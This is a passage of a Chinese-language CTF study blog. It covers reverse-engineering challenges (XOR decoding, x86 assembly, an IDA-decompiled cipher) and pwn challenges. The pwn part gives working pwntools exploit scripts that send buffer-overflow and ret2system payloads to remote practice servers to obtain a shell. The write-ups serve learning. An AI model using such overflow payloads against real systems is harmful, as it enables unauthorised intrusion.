/></p><p>​这里是一个循环↑分析:</p><p>​53行:循环边界,判断v1是否大于0,是的话跳出</p><p>​55行:将p1的第v2个字符赋值给v3</p><p>​58行:获取key(p0是Encoder类)给v4</p><p>​60行:v3和v4异或(xor)</p><p>​61行:字面意思</p><p>​65行:append到字符串(v0?)</p><p>​67行:v2自增,准备进行下一次循环</p><p>​也就是说这里的字符串对key进行了异或映射</p><h3 id="第二部分-main继续分析">第二部分—main继续分析</h3><p>​为什么有两个MainActivity.smail…</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202551209.png" alt="image-20230728202551209" style="zoom:33%;" /></p><p>​所以这里对key进行了重新赋值…我实在看不懂这东西的运行顺序…看WP看的这么个意思…</p><p>​总之就是要把p2和这个key进行异或运算然后就能出flag,p2就是这个(这个一看就懂):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728202753479.png" alt="image-20230728202753479" style="zoom:33%;" /></p><p>​那么我们另外写脚本吧,就用python吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">&quot;\u68ff\u68e2\u68e2\u68f2\u68e5\u68f7\u68ca\u68d0\u68c1\u68da\u68e8\u68e8\u68f5\u68e2\u68cc&quot;</span></span><br><span class="line">key = <span class="number">0x3ade68b1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) ^ key) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#因为extend ascii字符是0x0-0xFF 但是unicode肯定是越界的, 所以这里要和0xff进行与操作来把最后结果限制到0x0-0xff</span></span><br><span class="line"><span class="comment">#运行脚本得到flag</span></span><br></pre></td></tr></table></figure><p>​这里因为对py不熟悉所以还是看了题解QWQ</p><p>​NSSCTF{apkYYDS}</p><p>​结束…(相当于把大佬的WP抄了一遍…)</p><h2 id="asm1">asm1</h2><p>应该没有比我更闲的人了…这东西我还逆向出伪代码…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">asm1:</span><br><span class="line">&lt;+0&gt;:push   ebp              ; 将ebp寄存器的值保存到栈上</span><br><span class="line">&lt;+1&gt;:mov    ebp,esp         ; 将esp的值赋给ebp寄存器，建立新的栈帧</span><br><span class="line">&lt;+3&gt;:cmp    DWORD PTR [ebp+0x8],0x3a2   ; 比较ebp+0x8处的双字值与0x3a2</span><br><span class="line">&lt;+10&gt;:jg     0x512 &lt;asm1+37&gt;   ; 如果大于则跳转到地址0x512处继续执行</span><br><span class="line">&lt;+12&gt;:cmp    DWORD PTR [ebp+0x8],0x358   ; 否则，比较ebp+0x8处的双字值与0x358</span><br><span class="line">&lt;+19&gt;:jne    0x50a &lt;asm1+29&gt;   ; 如果不等于则跳转到地址0x50a处继续执行</span><br><span class="line">&lt;+21&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+24&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+27&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+29&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+32&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+35&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+37&gt;:cmp    DWORD PTR [ebp+0x8],0x6fa   ; 比较ebp+0x8处的双字值与0x6fa</span><br><span class="line">&lt;+44&gt;:jne    0x523 &lt;asm1+54&gt;   ; 如果不等于则跳转到地址0x523处继续执行</span><br><span class="line">&lt;+46&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+49&gt;:sub    eax,0x12        ; 将eax寄存器的值减去0x12</span><br><span class="line">&lt;+52&gt;:jmp    0x529 &lt;asm1+60&gt;   ; 跳转到地址0x529处继续执行</span><br><span class="line">&lt;+54&gt;:mov    eax,DWORD PTR [ebp+0x8]    ; 将ebp+0x8处的双字值赋给eax寄存器</span><br><span class="line">&lt;+57&gt;:add    eax,0x12        ; 将eax寄存器的值加上0x12</span><br><span class="line">&lt;+60&gt;:pop    ebp              ; 恢复栈帧，将栈顶指针赋给ebp寄存器</span><br><span class="line">&lt;+61&gt;:ret                    ; 返回</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来伪代码分析:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> &amp;k = [ebp+<span class="number">0x8</span>] <span class="comment">//写了个引用代表这个内存了哈哈哈</span></span><br><span class="line"><span class="keyword">if</span>(k&gt;<span class="number">0x3a2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(k!=<span class="number">0x6fa</span>)&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax+=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ax=k</span><br><span class="line">        ax-=<span class="number">0x12</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(k!=<span class="number">0x358</span>)&#123;</span><br><span class="line">    ax=k</span><br><span class="line">    ax-=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ax=p</span><br><span class="line">    ax+=<span class="number">0x12</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注意返回值就是eax</span></span><br></pre></td></tr></table></figure><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731233248628.png" alt="image-20230731233248628" style="zoom:33%;" /></p><p>貌似是动态flag,我这里是0x6fa,所以结果就是0x6fa-0x12==0x6e8</p><p>结束…</p><h2 id="asm2">asm2</h2><p>也是看代码,这个题就是一个循环:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235735960.png" alt="image-20230731235735960"></p><p>写解密代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">0x21</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">0x2</span>;</span><br><span class="line">    <span class="keyword">while</span>(b&lt;=<span class="number">0xfb46</span>)&#123;</span><br><span class="line">        a+=<span class="number">1</span>;</span><br><span class="line">        b+=<span class="number">0x74</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#x&quot;</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230731235633534.png" alt="image-20230731235633534" style="zoom:33%;" /></p><p>结束…</p><h2 id="asm3">asm3</h2><p>这道题试试用c调用汇编函数,首先在win下编译失败…</p><h3 id="ubuntu下编译环境的搭建">ubuntu下编译环境的搭建</h3><p>然后转到ubuntu,在编译时报了一个错:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091451315.png" alt="image-20230801091451315" style="zoom:33%;" /><p>百度后了解到是在x86_64直接编译32位程序报错,需要安装multilib库:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801091609808.png" alt="image-20230801091609808" style="zoom:33%;" /><p>真就是配环境配了半天…又得更新包索引…</p><h3 id="代码修改">代码修改</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101549684.png" alt="image-20230801101549684" style="zoom:45%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101514580.png" alt="image-20230801101514580" style="zoom:50%;" /><h3 id="运行结果">运行结果</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801101445107.png" alt="image-20230801101445107"></p><p>有一说一,没懂明白全为0的寄存器如何运行sub指令,不知道是我看的不对还是咋的</p><p>代码就是多了几个AL,AH寄存器而已(但是我不会算…字节位置有点没弄明白)</p><p>x86平台(即32位平台)的EAX占32位(4字节),EAX的低16位是AX,AX的低8位是AL,AX的高8位是AH</p><p>但是算起来内存没弄明白…</p><p>暂时结束…</p><h2 id="reverse-cipher">reverse_cipher</h2><p>这题简单,直接拖IDA看,逆向分析逻辑就行,就是最后那个}字符不知道咋的IDA逆向出v11=v5…v5前面都没有初始化…不过不影响…手动putchar(str[23]);就行</p><p>直接在IDA逆向出的代码中加注释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ptr[<span class="number">23</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF //保存flag</span></span><br><span class="line">    <span class="type">char</span> v5; <span class="comment">// [rsp+17h] [rbp-39h] //?</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-24h] //标志位</span></span><br><span class="line">    FILE *v7; <span class="comment">// [rsp+30h] [rbp-20h] //rev_this的文件指针</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+38h] [rbp-18h] //flag的文件指针</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">    <span class="type">char</span> v11; <span class="comment">// [rsp+4Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">    stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    v7 = fopen(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No flag found, please make sure this is run on the server&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;please run this on the server&quot;</span>);</span><br><span class="line"></span><br><span class="line">    v6 = fread(ptr, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, stream); <span class="comment">//v6用于检查是否成功读取,flag长度为0x18==24</span></span><br><span class="line">                                            <span class="comment">//flag保存到ptr数组中</span></span><br><span class="line">                                            <span class="comment">//最后一位ptr[23]没有使用? &#x27;&#125;&#x27;?(一开始以为是&#x27;\0&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i ) &#123;<span class="comment">//读取前8个</span></span><br><span class="line">        v11 = ptr[i];</span><br><span class="line">        fputc(v11, v7);<span class="comment">//向v7(即rev_this文件)原封不动的写入前8位flag字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">8</span>; j &lt;= <span class="number">22</span>; ++j ) &#123; <span class="comment">//读取第9-23个flag字符</span></span><br><span class="line">        v11 = ptr[j];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//转换算法</span></span><br><span class="line">        <span class="keyword">if</span> ( (j &amp; <span class="number">1</span>) != <span class="number">0</span> ) <span class="comment">//如果j为奇数---j==8时是偶数</span></span><br><span class="line">            v11 -= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v11 += <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        fputc(v11, v7);<span class="comment">//处理后写入</span></span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v5;<span class="comment">//这里IDA分析的有点问题,问题不大</span></span><br><span class="line">    fputc(v5, v7);</span><br><span class="line">    fclose(v7);</span><br><span class="line">    <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写解密脚本(c/c++代码叫脚本?):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    FILE* rev_this = <span class="built_in">fopen</span>(<span class="string">&quot;rev_this&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">fread</span>(str, <span class="number">0x18</span>uLL, <span class="number">1uLL</span>, rev_this);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">8</span>;i&lt;<span class="number">23</span>;++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&amp;<span class="number">1</span>!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">putchar</span>(str[i]+<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">putchar</span>(str[i]<span class="number">-5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(str[<span class="number">23</span>]);<span class="comment">//单独处理一下那个v5(其实提交的时候加个&#125;就行,</span></span><br><span class="line">    <span class="comment">//但是这里因为不知道flag长啥样所以还是打印一下看看...万一是什么&#x27;\0&#x27;呢,doge)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230801104929793.png" alt="image-20230801104929793"></p><p>结束…</p><h1 id="pwn">PWN</h1><h2 id="ciscn-2019-n-8">ciscn_2019_n_8</h2><p>先看看是啥文件—32位的,用IDA32打开</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802131013964.png" alt="image-20230802131013964" style="zoom:33%;" /><p>尝试IDA动态调试,莫名其妙不能动弹?难道是开了保护?(开保护是不能调试吗?)</p><p>额,nb…火力全开…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133400255.png" alt="image-20230802133400255" style="zoom:33%;" /><p>还是静态分析吧…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802133651202.png" alt="image-20230802133651202" style="zoom: 50%;" /><p>这里其实最没弄明白的其实是那个LL,不确定val作为数组每个元素应该填充多长…但是这题是&lt;二进制&gt;赛项…</p><p>所以理论上这里应该是重点要关注的地方…</p><p>那么尽管IDA反编译出来的伪代码有点玄学…但是发现有一个重要的指针类型转换的步骤:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br></pre></td></tr></table></figure><p><code>QWORD</code>这个东西是4字节…众所周知,一个字是2字节,那么QWORD是4个字,也就是8字节…对上了,就是LL(long long)</p><p>那么就往进塞数据呗(这里我仍然想吐槽python的类型转换)</p><p>用python写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29245</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p64(<span class="number">17</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果(第二次的截图,省略了ls了…doge)<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802140330345.png" alt="image-20230802140330345"></p><p>结束…</p><h2 id="mrctf2020-easyoverflow">mrctf2020_easyoverflow</h2><p>这题就是个字符串溢出</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154650856.png" alt="image-20230802154650856" style="zoom: 50%;" /><p>首先main中v5被赋值为一个字符串,我叫他fake_flag0,然后有一个对v4的gets()</p><p>再看下面判断调用了check,并传递了v5这个字符数组</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154817689.png" alt="image-20230802154817689" style="zoom:50%;" /><p>参数和另一个字符串比较,去看看:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802154845478.png" alt="image-20230802154845478" style="zoom:50%;" /><p>把这个字符串复制出来,我叫他fake_flag1</p><p>然后发现 main中v4有0x30个字节(48个)—(-0x40)-(-0x70)==0x30</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155008720.png" alt="image-20230802155008720" style="zoom:50%;" /><p>所以把这段内存覆盖了就行,exp如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155044396.png" alt="image-20230802155044396" style="zoom:50%;" /><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802155058403.png" alt="image-20230802155058403" style="zoom:50%;" /><p>结束…</p><h2 id="jarvisoj-level2">jarvisoj_level2</h2><p>这道题最大的收获就是把x86的堆栈看了一遍,<s>还有脑内调试</s></p><p>有关X86 32位汇编利用堆栈传递函数参数的过程:</p><p>​<a href="https://blog.csdn.net/weixin_62320071/article/details/129475981">https://blog.csdn.net/weixin_62320071/article/details/129475981</a></p><p>​<a href="https://cloud.tencent.com/developer/article/2123636">https://cloud.tencent.com/developer/article/2123636</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&amp;utm_id=0">https://zhuanlan.zhihu.com/p/290689333?ivk_sa=1024320u&amp;utm_id=0</a></p><p>​<img src="https://pic2.zhimg.com/80/v2-53b1f83688ed5cc4bc7c5efa791a315d_1440w.webp" alt="img" style="zoom:65%;" /></p><p>题解:</p><p>这道题是典型的栈溢出,IDA反编译后的代码非常简单,有system函数的地址,而且我们可以通过字符串查找找到存在/bin/bash这个字符串(可获取地址)</p><p>那么我们就直接让vulnerable_function返回的时候跳转到system函数去getshell就可以</p><p>具体是由于read可输入的长度大于缓冲区的长度,所以存在溢出,那么只需要合理构造payload即可进行getshell</p><p>(但是我做这题很吃力,x86汇编属实不会,主要是对函数栈帧掌握不清楚)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">hacker = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25439</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x88</span></span><br><span class="line">system_func_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_sh_str_addr = <span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#  首先先将该字符串数组填满，再输入一个地址，该地址将会作为新的栈底地址 ebp</span></span><br><span class="line"><span class="comment"># 再接着写入 函数调用返回的地址（即该值将来会pop 到 eip 中），即执行我们的system函数，为了把 字符串 /bin/sh 地址传入，我们还要往栈中随意插入一个将来的返回地址，再插入/bin/sh 地址</span></span><br><span class="line">payload = padding * <span class="string">b&#x27;a&#x27;</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230802191847698.png" alt="image-20230802191847698"></p><p>勉强结束…</p><h2 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h2><h3 id="这道题学习到的知识点">这道题学习到的知识点</h3><p>参阅:</p><p>​<a href="https://zhuanlan.zhihu.com/p/502718676">https://zhuanlan.zhihu.com/p/502718676</a></p><p>​<a href="https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers">https://stackoverflow.com/questions/23367624/intel-64-rsi-and-rdi-registers</a></p><p>​<a href="https://www.cnblogs.com/nemuzuki/p/17218722.html">https://www.cnblogs.com/nemuzuki/p/17218722.html</a></p><p>​</p><h4 id="x86-64函数传参使用到的寄存器">x86_ 64函数传参使用到的寄存器</h4><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803114038935.png" alt="image-20230803114038935" style="zoom:50%;" /></p><p>​重点是rdi,rsi,rdx,rcx这几个</p><h3 id="分析题目">分析题目</h3><h4 id="1-参数问题">1.参数问题</h4><p>​这道题也是栈溢出,不过是x86_64的程序,所以我们重点注意的应该是去考虑x86_64和x86的堆栈(或者说函数调用时)有什么区别,而且重点要关注函数传参有什么不同</p><p>​经过学习,了解到在x86中,各个参数依次从右向左入栈(CDECL?),然后再压栈eip和ebp;</p><p>​而在x86_64中,如果子函数的参数数量&lt;=6个,那么就会使用到6个特殊的寄存器,也就是上面的rdi，rsi，rdx，rcx，r8，r9这6个寄存器.然后如果还有参数,则像32位一样压栈.</p><p>​那么也就是说,64位程序调用函数时,<strong>会先把参数从寄存器中pop出来,也就是pop rdi; ret指令</strong></p><p>​对应到本题中调用system()函数只需要传递一个字符串,也就是system执行的命令,所以只需要多考虑一个rdi(第一个入参对应的寄存器)的问题</p><h4 id="2-题目分析">2.题目分析</h4><p>​分析好关键后,接下来开始审题</p><p>​这次做题思路比较清晰,而且看了看雪上的某篇IDA使用教程,这回在IDAview视图中认真分析了一下汇编,后面记录一下(虽然和这道题的题解关系不大,但是有助于理解x86_64函数传参)</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115419472.png" alt="image-20230803115419472" style="zoom:50%;" /></p><p>​题目和x86版本的基本一致,仍然是标准的栈溢出:buf数组长度为0x80,然而read()可以输入0x200,满足溢出</p><p>​同样,去找system()的地址和/bin/bash的地址</p><p>​shift+F12打开字符串,可以看到存在/bin/bash—0x600A90</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115829908.png" alt="image-20230803115829908" style="zoom:50%;" /></p><p>​发现有_system函数(注意不是extern的那个system)—0x4004C0</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803115952419.png" alt="image-20230803115952419" style="zoom: 40%;" /></p><p>​接下来就是区别,需要找到pop rdi; ret指令的地址,以便调用</p><p>​这里需要使用到Linux下的ROPgadget工具查找(第一次用这个,看了一下使用方法)</p><p>​找到地址为0x4006b3<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803121412077.png" alt="image-20230803121412077"></p><h4 id="3-payload">3.payload</h4><p>​覆盖模板: [函数局部变量(buf数组)]+[rbp]+[pop rdi; ret指令的地址]+[’/bin/bash’的地址]+[system()函数的地址(实际上是那个_system())]</p><p>​python代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27828</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4004C0</span></span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span>) + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x8</span>) + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122534132.png" alt="image-20230803122534132" style="zoom:45%;" /><p>​题解到此结束…</p><h3 id="题目idaview分析记录">题目IDAview分析记录</h3><h4 id="main-汇编分析">main()汇编分析</h4><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230803122808494.png" alt="image-20230803122808494"></p><p>main中有两个变量var_10和var_4</p><p>首先是调用main时,开头的push rbp;mov rbp,rsp指令创建函数栈帧,然后sub 